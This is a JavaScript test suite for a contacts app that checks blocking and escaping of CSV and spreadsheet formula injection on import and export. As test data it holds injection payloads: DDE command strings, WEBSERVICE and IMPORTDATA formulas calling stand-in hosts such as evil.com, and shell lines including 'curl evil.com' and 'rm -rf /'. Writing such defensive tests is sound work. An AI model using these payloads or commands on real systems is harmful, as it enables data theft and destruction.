// tests/csv.injection.security.test.js
const request = require('supertest');
const mongoose = require('mongoose');
const app = require('../app');
const Contact = require('../models/Contact');
const User = require('../models/User');
const ContactService = require('../services/contactService');
const testAuth = require('./helpers/testAuth');

describe('CSV Injection Security Tests', () => {
  let authAgent, testUser, contactService;

  beforeAll(async () => {
    // Create test user
    testUser = new User({
      username: 'csvtest',
      email: 'csvtest@example.com',
      password: 'password123',
      role: 'user'
    });
    await testUser.save();
    
    // Create authenticated agent
    authAgent = await testAuth.createAuthenticatedAgent(app, testUser);
    
    contactService = new ContactService();
  });

  beforeEach(async () => {
    // Clean up contacts before each test
    await Contact.deleteMany({ ownerId: testUser._id });
  });

  afterAll(async () => {
    // Cleanup test data
    if (testUser) {
      await Contact.deleteMany({ ownerId: testUser._id });
      await User.deleteOne({ _id: testUser._id });
    }
  });

  describe('CSV Import Formula Injection Prevention', () => {
    test('should block basic formula injection attempts', async () => {
      const maliciousCSV = `email,firstName,lastName,notes
test@example.com,=cmd|' /C calc'!A0,Normal,Safe notes
test2@example.com,Normal,=WEBSERVICE("http://evil.com"),Notes
test3@example.com,@SUM(1+1),Normal,=HYPERLINK("http://malicious.com")`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: maliciousCSV,
          options: { skipDuplicates: true }
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('MALICIOUS_CONTENT_DETECTED');
    });

    test('should block advanced Excel formula injection', async () => {
      const advancedMaliciousCSV = `email,firstName,lastName
test@example.com,=IMPORTDATA("http://evil.com/data"),Normal
test2@example.com,Normal,=DDE("cmd";"/C calc";"")
test3@example.com,+WEBSERVICE("http://attacker.com"),LastName`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: advancedMaliciousCSV
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('MALICIOUS_CONTENT_DETECTED');
    });

    test('should block Google Sheets injection attempts', async () => {
      const googleSheetsCSV = `email,firstName,lastName,notes
test@example.com,=IMPORTXML("http://evil.com/xml"),Normal,Notes
test2@example.com,Normal,=IMPORTHTML("http://attacker.com"),"=IMPORTDATA(""http://bad.com"")"`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: googleSheetsCSV
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('MALICIOUS_CONTENT_DETECTED');
    });

    test('should block command execution attempts', async () => {
      const commandInjectionCSV = `email,firstName,lastName,notes
test@example.com,=cmd|' /C calc'!A0,Normal,Notes
test2@example.com,powershell -Command "Write-Host Evil",Normal,Notes
test3@example.com,bash -c "curl evil.com",Normal,Notes
test4@example.com,sh -c "rm -rf /",Normal,Notes`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: commandInjectionCSV
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('MALICIOUS_CONTENT_DETECTED');
    });

    test('should block tab and carriage return formula injection', async () => {
      const tabCarriageCSV = `email,firstName,lastName
test@example.com,\t=cmd,Normal
test2@example.com,Normal,\r=WEBSERVICE("http://evil.com")`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: tabCarriageCSV
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('MALICIOUS_CONTENT_DETECTED');
    });

    test('should allow safe CSV data to pass through', async () => {
      const safeCSV = `email,firstName,lastName,notes
john@example.com,John,Doe,Regular contact
jane@example.com,Jane,Smith,Another safe contact
bob@company.com,Bob,Johnson,Business contact with + in company name`;

      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: safeCSV,
          options: { skipDuplicates: true }
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.imported).toHaveLength(3);
    });
  });

  describe('CSV Cell Sanitization', () => {
    test('should sanitize formula indicators in cell values', () => {
      const testCases = [
        { input: '=SUM(A1:A10)', expected: "'=SUM(A1:A10)" },
        { input: '@WEBSERVICE("http://evil.com")', expected: "'@WEBSERVICE(\"http://evil.com\")" },
        { input: '+IMPORTDATA("http://bad.com")', expected: "'+IMPORTDATA(\"http://bad.com\")" },
        { input: '-HYPERLINK("http://malicious.com")', expected: "'-HYPERLINK(\"http://malicious.com\")" },
        { input: '|cmd /c calc', expected: "'|cmd /c calc" },
        { input: 'Normal text', expected: 'Normal text' },
        { input: 'Text with + sign', expected: 'Text with + sign' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = contactService.sanitizeCSVCell(input);
        expect(result).toBe(expected);
      });
    });

    test('should handle dangerous function calls', () => {
      const testCases = [
        { input: 'WEBSERVICE("http://evil.com")', expected: "'WEBSERVICE(\"http://evil.com\")" },
        { input: 'Some IMPORTDATA call here', expected: "'Some IMPORTDATA call here" },
        { input: 'DDE connection attempt', expected: "'DDE connection attempt" },
        { input: 'Normal function call', expected: 'Normal function call' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = contactService.sanitizeCSVCell(input);
        expect(result).toBe(expected);
      });
    });

    test('should remove control characters', () => {
      const inputWithControlChars = 'Normal\x00text\x07with\x1Fcontrol\x7Fchars';
      const result = contactService.sanitizeCSVCell(inputWithControlChars);
      expect(result).toBe('Normaltextwithcontrolchars');
    });

    test('should handle null and undefined values', () => {
      expect(contactService.sanitizeCSVCell(null)).toBe(null);
      expect(contactService.sanitizeCSVCell(undefined)).toBe(undefined);
      expect(contactService.sanitizeCSVCell('')).toBe('');
    });
  });

  describe('CSV Export Security', () => {
    beforeEach(async () => {
      // Create test contacts with potentially dangerous content
      const testContacts = [
        {
          email: 'test1@example.com',
          firstName: '=SUM(1+1)',
          lastName: 'Normal',
          notes: '@WEBSERVICE("http://evil.com")',
          ownerId: testUser._id,
          status: 'active'
        },
        {
          email: 'test2@example.com', 
          firstName: 'Safe',
          lastName: '+IMPORTDATA("http://bad.com")',
          notes: 'Safe notes',
          ownerId: testUser._id,
          status: 'active'
        }
      ];

      await Contact.insertMany(testContacts);
    });

    test('should export sanitized CSV data', async () => {
      const response = await authAgent.get('/api/contacts/export/csv')
        .query({ status: 'all' });

      expect(response.status).toBe(200);
      expect(response.headers['content-type']).toMatch(/text\/csv/);
      expect(response.headers['content-disposition']).toMatch(/attachment; filename="contacts-export-/);
      
      const csvContent = response.text;
      
      // Check that formula indicators are properly escaped
      expect(csvContent).toContain("'=SUM(1+1)");  // Formula escaped
      expect(csvContent).toContain("'@WEBSERVICE(\"http://evil.com\")");  // Function escaped
      expect(csvContent).toContain("'+IMPORTDATA(\"http://bad.com\")");  // Plus formula escaped
      
      // Ensure no raw formulas remain
      expect(csvContent).not.toContain('=SUM(1+1)');
      expect(csvContent).not.toContain('@WEBSERVICE("http://evil.com")');
      expect(csvContent).not.toContain('+IMPORTDATA("http://bad.com")');
    });

    test('should set proper security headers for CSV export', async () => {
      const response = await authAgent.get('/api/contacts/export/csv');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['content-type']).toMatch(/text\/csv; charset=utf-8/);
    });

    test('should require authentication for CSV export', async () => {
      const response = await request(app)
        .get('/api/contacts/export/csv');

      expect(response.status).toBe(401);
      expect(response.body.code).toBe('AUTH_REQUIRED');
    });

    test('should respect rate limiting for CSV export', async () => {
      // Make multiple requests to trigger rate limiting
      const requests = Array(15).fill().map(() => 
        authAgent.get('/api/contacts/export/csv')
      );

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('CSV Field Escaping', () => {
    test('should properly escape fields according to RFC 4180', () => {
      const testCases = [
        { input: 'Simple text', expected: 'Simple text' },
        { input: 'Text with, comma', expected: '"Text with, comma"' },
        { input: 'Text with "quotes"', expected: '"Text with ""quotes"""' },
        { input: 'Text with\nnewline', expected: '"Text with newline"' },
        { input: 'Text with\rcarriage', expected: '"Text with carriage"' },
        { input: '', expected: '""' },
        { input: null, expected: '""' },
        { input: undefined, expected: '""' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = contactService.escapeCSVField(input);
        expect(result).toBe(expected);
      });
    });

    test('should sanitize fields before escaping', () => {
      const maliciousField = '=SUM(1+1), with comma';
      const result = contactService.escapeCSVField(maliciousField);
      expect(result).toBe("\"'=SUM(1+1), with comma\"");
    });
  });

  describe('CSV Export Data Sanitization', () => {
    test('should sanitize contact object for CSV export', () => {
      const maliciousContact = {
        email: 'test@example.com',
        firstName: '=WEBSERVICE("http://evil.com")',
        lastName: 'Normal',
        notes: '@IMPORTDATA("http://bad.com")',
        tags: ['=SUM(1+1)', 'normal-tag', '+HYPERLINK("http://malicious.com")']
      };

      const sanitized = contactService.sanitizeForCSVExport(maliciousContact);
      
      expect(sanitized.firstName).toBe("'=WEBSERVICE(\"http://evil.com\")");
      expect(sanitized.notes).toBe("'@IMPORTDATA(\"http://bad.com\")");
      expect(sanitized.tags[0]).toBe("'=SUM(1+1)");
      expect(sanitized.tags[1]).toBe('normal-tag');
      expect(sanitized.tags[2]).toBe("'+HYPERLINK(\"http://malicious.com\")");
      expect(sanitized.email).toBe('test@example.com'); // Email should remain unchanged
    });
  });

  describe('CSV Security Monitoring', () => {
    test('should log CSV export activities', async () => {
      const logSpy = jest.spyOn(console, 'log').mockImplementation();

      await authAgent.get('/api/contacts/export/csv');

      expect(logSpy).toHaveBeenCalledWith(
        expect.stringContaining('📥 CSV export requested:'),
        expect.objectContaining({
          userId: expect.any(String),
          ip: expect.any(String),
          contactCount: expect.any(Number),
          timestamp: expect.any(String)
        })
      );

      logSpy.mockRestore();
    });

    test('should log CSV import security violations', async () => {
      const warnSpy = jest.spyOn(console, 'warn').mockImplementation();

      const maliciousCSV = 'email,firstName\ntest@example.com,=cmd';

      await authAgent.post('/api/contacts/import')
        .send({ csvData: maliciousCSV });

      expect(warnSpy).toHaveBeenCalledWith(
        'Potentially malicious content detected in CSV upload',
        expect.objectContaining({
          ip: expect.any(String),
          userAgent: expect.any(String),
          pattern: expect.any(String)
        })
      );

      warnSpy.mockRestore();
    });
  });

  describe('CSV Size and Content Validation', () => {
    test('should reject oversized CSV data', async () => {
      // Create CSV data larger than 5MB
      const largeCSV = 'email,firstName,lastName,notes\n' + 
        'test@example.com,'.repeat(2000000) + '\n';

      const response = await authAgent.post('/api/contacts/import')
        .send({ csvData: largeCSV });

      expect(response.status).toBe(413);
      expect(response.body.code).toBe('CSV_SIZE_LIMIT_EXCEEDED');
    });

    test('should reject binary content in CSV', async () => {
      const binaryCSV = 'email,firstName\ntest@example.com,\x00binary\x01content\x02';

      const response = await authAgent.post('/api/contacts/import')
        .send({ csvData: binaryCSV });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('INVALID_CSV_CONTENT');
    });

    test('should validate MIME type for CSV uploads', async () => {
      const response = await authAgent.post('/api/contacts/import')
        .send({
          csvData: 'email,firstName\ntest@example.com,John',
          mimeType: 'application/json',
          fileName: 'test.csv'
        });

      expect(response.status).toBe(400);
      expect(response.body.code).toBe('INVALID_MIME_TYPE');
    });
  });
});